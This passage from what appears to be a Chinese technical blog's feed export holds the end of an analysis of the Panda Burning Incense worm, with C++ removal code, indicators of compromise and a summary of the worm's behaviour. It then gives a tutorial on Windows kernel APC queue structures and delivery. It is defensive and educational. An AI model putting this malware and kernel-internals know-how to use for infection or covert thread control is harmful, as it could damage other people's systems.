class="string">"校验和验证成功，正在删除...\r\n"</span>); </span><br><span class="line">                <span class="comment">// 去除文件的隐藏、系统以及只读属性</span></span><br><span class="line">                DWORD dwFileAttributes = GetFileAttributes(szSetupPath);</span><br><span class="line">                dwFileAttributes &amp;= ~FILE_ATTRIBUTE_HIDDEN;</span><br><span class="line">                dwFileAttributes &amp;= ~FILE_ATTRIBUTE_SYSTEM;</span><br><span class="line">                dwFileAttributes &amp;= ~FILE_ATTRIBUTE_READONLY;</span><br><span class="line">                SetFileAttributes(szSetupPath, dwFileAttributes);</span><br><span class="line">                <span class="comment">// 删除setup.exe</span></span><br><span class="line">                bRet = DeleteFile(szSetupPath);</span><br><span class="line">                <span class="keyword">if</span> (bRet)</span><br><span class="line">                &#123;</span><br><span class="line">                    csTxt += pTmp;</span><br><span class="line">                    csTxt += _T(<span class="string">"setup.exe病毒被删除!\r\n"</span>);</span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    csTxt += pTmp;</span><br><span class="line">                    csTxt += _T(<span class="string">"setup.exe病毒无法删除\r\n"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 去除文件的隐藏、系统以及只读属性</span></span><br><span class="line">        DWORD dwFileAttributes = GetFileAttributes(szAutorunPath);</span><br><span class="line">        dwFileAttributes &amp;= ~FILE_ATTRIBUTE_HIDDEN;</span><br><span class="line">        dwFileAttributes &amp;= ~FILE_ATTRIBUTE_SYSTEM;</span><br><span class="line">        dwFileAttributes &amp;= ~FILE_ATTRIBUTE_READONLY;</span><br><span class="line">        SetFileAttributes(szAutorunPath, dwFileAttributes);</span><br><span class="line">        <span class="comment">// 删除autorun.inf</span></span><br><span class="line">        bRet = DeleteFile(szAutorunPath);</span><br><span class="line">        csTxt += pTmp;</span><br><span class="line">        <span class="keyword">if</span> (bRet)</span><br><span class="line">        &#123;         </span><br><span class="line">            csTxt += _T(<span class="string">"autorun.inf被删除!\r\n"</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"autorun.inf不存在或无法删除\r\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 删除Desktop_.ini</span></span><br><span class="line">        FindFiles(pTmp);</span><br><span class="line">        <span class="comment">// 检查下一个盘符</span></span><br><span class="line">        pTmp += <span class="number">4</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    Sleep(<span class="number">10</span>);</span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">//  修复注册表内容，删除病毒启动项并修复文件的隐藏显示</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////</span></span><br><span class="line">    csTxt += _T(<span class="string">"正在检查注册表...\r\n"</span>);</span><br><span class="line">    SetDlgItemText(IDC_LIST,csTxt);</span><br><span class="line">    <span class="comment">// 首先检查启动项</span></span><br><span class="line">    <span class="keyword">char</span> RegRun[] = <span class="string">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span>;   </span><br><span class="line">    HKEY hKeyHKCU = <span class="literal">NULL</span>;    </span><br><span class="line">    LONG lSize = MAXBYTE;</span><br><span class="line">    <span class="keyword">char</span> cData[MAXBYTE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">long</span> lRet = RegOpenKey(HKEY_CURRENT_USER, RegRun, &amp;hKeyHKCU);</span><br><span class="line">    <span class="keyword">if</span>(lRet == ERROR_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        lRet = RegQueryValueEx(hKeyHKCU,<span class="string">"svcshare"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)cData,(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;lSize);</span><br><span class="line">        <span class="keyword">if</span> ( lRet == ERROR_SUCCESS)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (lstrcmp(cData,<span class="string">"C:\\WINDOWS\\system32\\drivers\\spoclsv.exe"</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                csTxt += _T(<span class="string">"注册表启动项中存在病毒信息\r\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            lRet = RegDeleteValue(hKeyHKCU,<span class="string">"svcshare"</span>);</span><br><span class="line">            <span class="keyword">if</span> (lRet == ERROR_SUCCESS)</span><br><span class="line">            &#123;</span><br><span class="line">                csTxt += _T(<span class="string">"注册表启动项中的病毒信息已删除！\r\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                csTxt += _T(<span class="string">"注册表启动项中的病毒信息无法删除\r\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"注册表启动项中不存在病毒信息\r\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        RegCloseKey(hKeyHKCU);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        csTxt += _T(<span class="string">"注册表启动项信息读取失败\r\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 接下来修复文件的隐藏显示，需要将CheckedValue的值设置为1</span></span><br><span class="line">    <span class="keyword">char</span> RegHide[] = <span class="string">"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL"</span>; </span><br><span class="line">    HKEY hKeyHKLM = <span class="literal">NULL</span>; </span><br><span class="line">    DWORD dwFlag = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">long</span> lRetHide = RegOpenKey(HKEY_LOCAL_MACHINE, RegHide, &amp;hKeyHKLM);</span><br><span class="line">    <span class="keyword">if</span>(lRetHide == ERROR_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        csTxt += _T(<span class="string">"检测注册表的文件隐藏选项...\r\n"</span>);</span><br><span class="line">        <span class="keyword">if</span>( ERROR_SUCCESS == RegSetValueEx(</span><br><span class="line">    hKeyHKLM,             <span class="comment">//subkey handle  </span></span><br><span class="line">                            <span class="string">"CheckedValue"</span>,       <span class="comment">//value name  </span></span><br><span class="line">                            <span class="number">0</span>,                    <span class="comment">//must be zero  </span></span><br><span class="line">                            REG_DWORD,            <span class="comment">//value type  </span></span><br><span class="line">                            (CONST BYTE*)&amp;dwFlag, <span class="comment">//pointer to value data  </span></span><br><span class="line">                            <span class="number">4</span>))                   <span class="comment">//length of value data</span></span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"注册表修复完毕！\r\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"无法恢复注册表的文件隐藏选项\r\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 病毒查杀完成</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////</span></span><br><span class="line">    csTxt += _T(<span class="string">"病毒查杀完成，请使用专业杀毒软件进行全面扫描！\r\n"</span>);</span><br><span class="line">    SetDlgItemText(IDC_LIST,csTxt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="5．总结"><a href="#5．总结" class="headerlink" title="5．总结"></a>5．总结</h1><p>熊猫烧香是一种蠕虫病毒，使用Delphi语言编写，本身有FSG壳，这里的程序已经被脱壳。病毒本身具有自我复制，本地感染，局域网感染，感染本地成程序和网页代码，并且会根据系统进程和根目录程序是否存在进行自我复制，会进行关闭服务，删除系统备份，自启动，修改注册表，关闭杀毒软件，等行为，所以在当年传播范围广，杀毒毕竟困难的特点。</p><h1 id="6．参考资料"><a href="#6．参考资料" class="headerlink" title="6．参考资料"></a>6．参考资料</h1><p>【1】 姜烨博客 <a href="https://blog.csdn.net/ioio_jy/article/details/40961557" target="_blank" rel="noopener">https://blog.csdn.net/ioio_jy/article/details/40961557</a><br>【2】 看雪黑手鱼发帖 <a href="https://bbs.pediy.com/thread-217802.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-217802.htm</a><br>【3】 《C++反汇编与逆向分析技术揭秘》 钱林松,赵海旭著    </p>]]></content>
      
      <categories>
          
          <category> 报告 - 熊猫烧香病毒分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 病毒分析 </tag>
            
            <tag> 熊猫烧香 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>APC异步过程调用</title>
      <link href="/2018/07/09/APC%E5%BC%82%E6%AD%A5%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8/"/>
      <url>/2018/07/09/APC%E5%BC%82%E6%AD%A5%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>线程是不能被“杀掉”、“挂起”、“恢复”的，线程在执行的时候自己占据着CPU,别人怎么可能控制它呢？<br>举个极端的例子：如果不调用API,屏蔽中断,并保证代码不出现异常，线程将永久占用CPU，何谈控制呢?所以说线程如果想“死”，一定是自己执行代码把自己杀死，不存在“他杀”这种情况！<br>那如果想改变一个线程的行为该怎么办呢?<br>可以给他提供一个函数，让它自己去调用，这个函数就是APC(Asyncroneus Procedure Call)，即异步过程调用。<br>APC队列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">nt!_KTHREAD</span><br><span class="line">...</span><br><span class="line">   +0x034 ApcState         : _KAPC_STATE</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">kd&gt; dt _KAPC_STATE</span><br><span class="line">nt!_KAPC_STATE</span><br><span class="line">   +0x000 ApcListHead//2个APC队列 用户APC和内核APC </span><br><span class="line">   +0x010 Process//线程所属或者所挂靠的进程</span><br><span class="line">   +0x014 KernelApcInProgress//内核APC是否正在执行</span><br><span class="line">   +0x015 KernelApcPending//是否有正在等待执行的内核APC</span><br><span class="line">   +0x016 UserApcPending//是否有正在等待执行的用户APC</span><br><span class="line"></span><br><span class="line">用户APC：APC函数地址位于用户空间，在用户空间执行.</span><br><span class="line">内核APC：APC函数地址位于内核空间，在内核空间执行.</span><br></pre></td></tr></table></figure><p>如果想一个线程行为，给他提供个APC，挂到+0x034ApcState的第一个成员0x000ApcListHead上，从而改变这个线程行为，下面是APC结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KAPC</span><br><span class="line">nt!_KAPC</span><br><span class="line">   +0x000 Type</span><br><span class="line">   +0x002 Size</span><br><span class="line">   +0x004 Spare0                               </span><br><span class="line">   +0x008 Thread                             +0x00c ApcListEntry</span><br><span class="line">   +0x014 KernelRoutine</span><br><span class="line">   +0x018 RundownRoutine</span><br><span class="line">   +0x01c NormalRoutine// 找到你提供的APC函数，并不完全等于APC函数的地址，后面会讲。</span><br><span class="line">   +0x020 NormalContext</span><br><span class="line">   +0x024 SystemArgument1</span><br><span class="line">   +0x028 SystemArgument2</span><br><span class="line">   +0x02c ApcStateIndex</span><br><span class="line">   +0x02d ApcMode</span><br><span class="line">   +0x02e Inserted</span><br></pre></td></tr></table></figure><p>那么什么时候执行APC呢？</p><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/28.png" alt="28"></p><p>内核APC是一定会处理，再看有没有用户APC，所以不需要判断内核APC。<br>KiServiceExit函数：</p><pre><code>这个函数是系统调用、异常或中断返回用户空间的必经之路。</code></pre><p>KiDeliverApc函数：</p><pre><code>负责执行APC函数</code></pre><h1 id="备用APC队列"><a href="#备用APC队列" class="headerlink" title="备用APC队列"></a>备用APC队列</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">nt!_KTHREAD</span><br><span class="line">   ...</span><br><span class="line">   +0x034 ApcState         : _KAPC_STATE</span><br><span class="line">   ...</span><br><span class="line">   +0x138 ApcStatePointer  : [2] Ptr32 _KAPC_STATE</span><br><span class="line">  ...</span><br><span class="line">   +0x14c SavedApcState    : _KAPC_STATE</span><br><span class="line">  ...</span><br><span class="line">   +0x165 ApcStateIndex    : UChar</span><br><span class="line">   +0x166 ApcQueueable     : UChar</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><h2 id="SavedApcState的意义"><a href="#SavedApcState的意义" class="headerlink" title="SavedApcState的意义"></a>SavedApcState的意义</h2><p>线程APC队列中的APC函数都是与进程相关联的，具体点说：A进程的T线程中的所有APC函数，要访问的内存地址都是A进程的。<br>但线程是可以挂靠到其他的进程：比如A进程的线程T，通过修改Cr3(改为B进程的页目录基址)，就可以访问B进程地址空间，即所谓“进程挂靠”。<br>当T线程挂靠B进程后，APC队列中存储的却仍然是原来的APC！具体点说，比如某个APC函数要读取一个地址为0x12345678的数据，如果此时进行读取，读到的将是B进程的地址空间，这样逻辑就错误了!</p><p>为了避免混乱，在T线程挂靠B进程时，会将ApcState中的值暂时存储到SavedApcState中，等回到原进程A时，再将APC队列恢复。<br>所以，SavedApcState又称为备用APC队列。   </p><h2 id="挂靠环境下ApcState的意义"><a href="#挂靠环境下ApcState的意义" class="headerlink" title="挂靠环境下ApcState的意义"></a>挂靠环境下ApcState的意义</h2><p>在挂靠的环境下，也是可以先线程APC队列插入APC的，那这种情况下，使用的是哪个APC队列呢？   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A进程的T线程挂靠B进程  A是T的所属进程  B是T的挂靠进程</span><br><span class="line"></span><br><span class="line">ApcState    B进程相关的APC函数     </span><br><span class="line"></span><br><span class="line">SavedApcStateA进程相关的APC函数</span><br></pre></td></tr></table></figure><p>在正常情况下，当前进程就是所属进程A，如果是挂靠情况下，当前进程就是挂靠进程B。   </p><h2 id="ApcStatePointer"><a href="#ApcStatePointer" class="headerlink" title="ApcStatePointer"></a>ApcStatePointer</h2><p>为了操作方便，_KTHREAD结构体中定义了一个指针数组ApcStatePointer ，长度为2。   </p><p>正常情况下：<br>    ApcStatePointer[0]  指向 ApcState<br>    ApcStatePointer[1]  指向 SavedApcState<br>挂靠情况下：<br>    ApcStatePointer[0]  指向 SavedApcState<br>    ApcStatePointer[1]  指向 ApcState    </p><h2 id="ApcStateIndex"><a href="#ApcStateIndex" class="headerlink" title="ApcStateIndex"></a>ApcStateIndex</h2><p>ApcStateIndex用来标识当前线程处于什么状态：</p><pre><code>0 正常状态  1 挂靠状态</code></pre><h2 id="ApcStatePointer-与-ApcStateIndex组合寻址"><a href="#ApcStatePointer-与-ApcStateIndex组合寻址" class="headerlink" title="ApcStatePointer 与 ApcStateIndex组合寻址"></a>ApcStatePointer 与 ApcStateIndex组合寻址</h2><p>正常情况下，向ApcState队列中插入APC时：   </p><p>　　ApcStatePointer[0]  指向 ApcState 此时ApcStateIndex的值为0<br>       ApcStatePointer[ApcStateIndex]  指向 ApcState   </p><p>挂靠情况下，向ApcState队列中插入APC时：<br>       ApcStatePointer[1]  指向 ApcState 此时ApcStateIndex的值为1<br>       ApcStatePointer[ApcStateIndex]  指向 ApcState     </p><p>总结：<br>        无论什么环境下，ApcStatePointer[ApcStateIndex] 指向的都是ApcState<br>        ApcState则总是表示线程当前使用的apc状态</p><h2 id="ApcQueueable"><a href="#ApcQueueable" class="headerlink" title="ApcQueueable"></a>ApcQueueable</h2><p>ApcQueueable用于表示是否可以向线程的APC队列中插入APC<br>当线程正在执行退出的代码时，会将这个值设置为0 ，如果此时执行<br>插入APC的代码(KeInsertQueueApc 后面会讲),在插入函数中会判断这个值的状态，如果为0，则插入失败。   </p><h1 id="APC挂入过程"><a href="#APC挂入过程" class="headerlink" title="APC挂入过程"></a>APC挂入过程</h1><p>无论是正常状态还是挂靠状态，都有两个APC队列，一个内核队列，一个用户队列。<br>每当要挂入一个APC函数时，不管是内核APC还是用户APC，内核都要准备一个KAPC的数据结构，并且将这个KAPC结构挂到相应的APC队列中。   </p><h2 id="KAPC结构"><a href="#KAPC结构" class="headerlink" title="KAPC结构"></a>KAPC结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KAPC</span><br><span class="line">nt!_KAPC</span><br><span class="line">   +0x000 Type//类型  APC类型为0x12</span><br><span class="line">   +0x002 Size//本结构体的大小  0x30</span><br><span class="line">   +0x004 Spare0    //未使用                             </span><br><span class="line">   +0x008 Thread //目标线程                                  </span><br><span class="line">   +0x00c ApcListEntry//APC队列挂的位置</span><br><span class="line">   +0x014 KernelRoutine//指向一个函数(调用ExFreePoolWithTag 释放APC)</span><br><span class="line">   +0x018 RundownRoutine//略 </span><br><span class="line">   +0x01c NormalRoutine//用户APC总入口  或者 真正的内核apc函数</span><br><span class="line">   +0x020 NormalContext//内核APC：NULL  用户APC：真正的APC函数</span><br><span class="line">   +0x024 SystemArgument1//APC函数的参数</span><br><span class="line">   +0x028 SystemArgument2//APC函数的参数</span><br><span class="line">   +0x02c ApcStateIndex//挂哪个队列，有四个值：0 1 2 3</span><br><span class="line">   +0x02d ApcMode//内核APC 用户APC</span><br><span class="line">   +0x02e Inserted//表示本apc是否已挂入队列 挂入前：0  挂入后  1</span><br></pre></td></tr></table></figure><h2 id="挂入流程："><a href="#挂入流程：" class="headerlink" title="挂入流程："></a>挂入流程：</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/14.png" alt="14"></p><h2 id="KeInitializeApc函数说明"><a href="#KeInitializeApc函数说明" class="headerlink" title="KeInitializeApc函数说明"></a>KeInitializeApc函数说明</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">VOID KeInitializeApc</span><br><span class="line">(</span><br><span class="line">IN PKAPC Apc,//KAPC指针，刚分配好还没有初始化的指针</span><br><span class="line">IN PKTHREAD Thread,//目标线程</span><br><span class="line">IN KAPC_ENVIRONMENT TargetEnvironment,//0 1 2 3四种状态</span><br><span class="line">IN PKKERNEL_ROUTINE KernelRoutine,//销毁KAPC的函数地址</span><br><span class="line">IN PKRUNDOWN_ROUTINE RundownRoutine OPTIONAL,</span><br><span class="line">IN PKNORMAL_ROUTINE NormalRoutine,//用户APC总入口或者内核apc函数</span><br><span class="line">IN KPROCESSOR_MODE Mode,//要插入用户apc队列还是内核apc队列</span><br><span class="line">IN PVOID Context//内核APC：NULL  用户APC：真正的APC函数</span><br><span class="line">) </span><br><span class="line"></span><br><span class="line">参考：KeInitializeApc函数(内核函数)</span><br></pre></td></tr></table></figure><h2 id="ApcStateIndex-1"><a href="#ApcStateIndex-1" class="headerlink" title="ApcStateIndex"></a>ApcStateIndex</h2><p>与KTHREAD(+0x165)的属性同名，但含义不一样：   </p><p>ApcStateIndex 有四个值：    </p><ol start="0"><li>原始环境</li><li>挂靠环境 </li><li>当前环境</li><li>插入APC时的当前环境   </li></ol><p>正常情况下：<br>    ApcStatePointer[0]  指向 ApcState<br>    ApcStatePointer[1]  指向 SavedApcState<br>挂靠情况下：<br>    ApcStatePointer[0]  指向 SavedApcState<br>    ApcStatePointer[1]  指向 ApcState       </p><p>2 初始化的时候，当前进程的ApcState</p><p>3 插入的时候，再做一次判断，判断当前进程的ApcState    </p><h2 id="KiInsertQueueApc函数说明"><a href="#KiInsertQueueApc函数说明" class="headerlink" title="KiInsertQueueApc函数说明"></a>KiInsertQueueApc函数说明</h2><p>1) 根据KAPC结构中的ApcStateIndex找到对应的APC队列</p><p>2) 再根据KAPC结构中的ApcMode确定是用户队列还是内核队列</p><p>3) 将KAPC挂到对应的队列中(挂到KAPC的ApcListEntry处)</p><p>4) 再根据KAPC结构中的Inserted置1，标识当前的KAPC为已插入状态</p><p>5) 修改KAPC_STATE结构中的KernelApcPending/UserApcPending（有内核/用户APC要执行）</p><h2 id="Alertable属性说明-是否运行被APC吵醒"><a href="#Alertable属性说明-是否运行被APC吵醒" class="headerlink" title="Alertable属性说明(是否运行被APC吵醒)"></a>Alertable属性说明(是否运行被APC吵醒)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   ...</span><br><span class="line">   +0x164 Alertable        : UChar</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">DWORD SleepEx(</span><br><span class="line">  DWORD dwMilliseconds, // time-out interval</span><br><span class="line">  BOOL bAlertable        // early completion option</span><br><span class="line">);</span><br><span class="line">DWORD WaitForSingleObjectEx(</span><br><span class="line">  HANDLE hHandle,        // handle to object</span><br><span class="line">  DWORD dwMilliseconds, // time-out interval</span><br><span class="line">          BOOL bAlertable        // alertable， option、//当前线程是否能被APC唤醒</span><br></pre></td></tr></table></figure><h2 id="Alertable总结"><a href="#Alertable总结" class="headerlink" title="Alertable总结"></a>Alertable总结</h2><p>1、Alertable=0 当前插入的APC函数未必有机会执行：UserApcPending = 0</p><p>2、Alertable=1 </p><pre><code>UserApcPending = 1将目标线程唤醒(从等待链表中摘出来，并挂到调度链表)</code></pre><h1 id="内核APC执行过程"><a href="#内核APC执行过程" class="headerlink" title="内核APC执行过程"></a>内核APC执行过程</h1><p>APC函数的执行与插入并不是同一个线程，具体点说：<br>在A线程中向B线程插入一个APC，插入的动作是在A线程中完成的，但什么时候执行则由B线程决定!，所以叫“异步过程调用”。<br>内核APC函数与用户APC函数的执行时间和执行方式也有区别，我们本节课主要学习内核APC的执行过程。   </p><h2 id="执行点：线程切换"><a href="#执行点：线程切换" class="headerlink" title="执行点：线程切换"></a>执行点：线程切换</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">SwapContext_判断是否有内核APC--&gt;KiSwapThread</span><br><span class="line">KiSwapThread--&gt;KiDeliverApc_执行内核APC函数</span><br></pre></td></tr></table></figure><h2 id="执行点：系统调用、中断或者异常-KiServiceExit-Ring0返回Ring3环时候"><a href="#执行点：系统调用、中断或者异常-KiServiceExit-Ring0返回Ring3环时候" class="headerlink" title="执行点：系统调用、中断或者异常(_KiServiceExit)Ring0返回Ring3环时候"></a>执行点：系统调用、中断或者异常(_KiServiceExit)Ring0返回Ring3环时候</h2><p>当要执行用户APC之前，先要执行内核APC<br>有用户APC才会执行内核APC。   </p><h2 id="KiDeliverApc函数执行流程"><a href="#KiDeliverApc函数执行流程" class="headerlink" title="KiDeliverApc函数执行流程"></a>KiDeliverApc函数执行流程</h2><p>1) 判断第一个链表是否为空</p><p>2) 判断KTHREAD.ApcState.KernelApcInProgress是否为1</p><p>3) 判断是否禁用内核APC(KTHREAD.KernelApcDisable是否为1)</p><p>4) 将当前KAPC结构体从链表中摘除</p><p>5) 执行KAPC.KernelRoutine指定的函数 释放KAPC结构体占用的空间</p><p>6) 将KTHREAD.ApcState.KernelApcInProgress设置为1 标识正在执行内核APC</p><p>7) 执行真正的内核APC函数(KAPC.NormalRoutine)</p><p>8) 执行完毕 将KernelApcInProgress改为0  </p><p>9) 循环</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1) 内核APC在线程切换的时候就会执行，这也就意味着，只要插入内核APC<br>很快就会执行。</p><p>2) 在执行用户APC之前会先执行内核APC。</p><p>3) 内核APC在内核空间执行，不需要换栈，一个循环全部执行完毕。</p><h1 id="用户APC执行过程"><a href="#用户APC执行过程" class="headerlink" title="用户APC执行过程"></a>用户APC执行过程</h1><p>当产生系统调用、中断或者异常，线程在返回用户空间前都会调用_KiServiceExit函数，在_KiServiceExit会判断是否有要执行的用户APC，如果有则调用KiDeliverApc函数(第一个参数为1)进行处理。</p><h2 id="执行用户APC时的堆栈操作"><a href="#执行用户APC时的堆栈操作" class="headerlink" title="执行用户APC时的堆栈操作"></a>执行用户APC时的堆栈操作</h2><p>处理用户APC要比内核APC复杂的多，因为，用户APC函数要在用户空间执行的，这里涉及到大量换栈的操作：<br>当线程从用户层进入内核层时，要保留原来的运行环境，比如各种寄存器，栈的位置等等  (_Trap_Frame)，然后切换成内核的堆栈，如果正常返回，恢复堆栈环境即可。<br>但如果有用户APC要执行的话，就意味着线程要提前返回到用户空间去执行，而且返回的位置不是线程进入内核时的位置，而是返回到其他的位置，每处理一个用户APC都会涉及到：   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">内核--&gt;用户空间</span><br><span class="line">用户空间--&gt;再回到内核空间</span><br></pre></td></tr></table></figure><p>堆栈的操作比较复杂，如果不了解堆栈的操作细节不可能理解用户APC是如何执行的！   </p><h2 id="KiDeliverApc函数分析"><a href="#KiDeliverApc函数分析" class="headerlink" title="KiDeliverApc函数分析"></a>KiDeliverApc函数分析</h2><p>1) 判断用户APC链表是否为空</p><p>2) 判断第一个参数是为1  </p><p>3) 判断ApcState.UserApcPending是否为1</p><p>4) 将ApcState.UserApcPending设置为0</p><p>5) 链表操作 将当前APC从用户队列中拆除</p><p>6) 调用函数(KAPC.KernelRoutine)释放KAPC结构体内存空间</p><p>7) 调用KiInitializeUserApc函数</p><h2 id="KiInitializeUserApc函数分析：备份CONTEXT"><a href="#KiInitializeUserApc函数分析：备份CONTEXT" class="headerlink" title="KiInitializeUserApc函数分析：备份CONTEXT"></a>KiInitializeUserApc函数分析：备份CONTEXT</h2><p>线程进0环时，原来的运行环境(寄存器栈顶等)保存到_Trap_Frame结构体中，如果要提前返回3环去处理用户APC，就必须要修改_Trap_Frame结构体：<br>比如：进0环时的位置存储在EIP中，现在要提前返回，而且返回的并不是原来的位置，那就意味着必须要修改EIP为新的返回位置。还有堆栈ESP,也要修改为处理APC需要的堆栈。那原来的值怎么办呢?处理完APC后该如何返回原来的位置呢?<br>KiInitializeUserApc要做的第一件事就是备份：<br>将原来_Trap_Frame的值备份到一个新的结构体中(CONTEXT),这个功能由其子函数KeContextFromKframes来完成。    </p><h2 id="KiInitializeUserApc函数分析：堆栈图"><a href="#KiInitializeUserApc函数分析：堆栈图" class="headerlink" title="KiInitializeUserApc函数分析：堆栈图"></a>KiInitializeUserApc函数分析：堆栈图</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/15.png" alt="15"></p><h2 id="KiInitializeUserApc函数分析：准备用户层执行环境"><a href="#KiInitializeUserApc函数分析：准备用户层执行环境" class="headerlink" title="KiInitializeUserApc函数分析：准备用户层执行环境"></a>KiInitializeUserApc函数分析：准备用户层执行环境</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/16.png" alt="16"></p><h2 id="ntdll-KiUserApcDispatcher分析-参加代码"><a href="#ntdll-KiUserApcDispatcher分析-参加代码" class="headerlink" 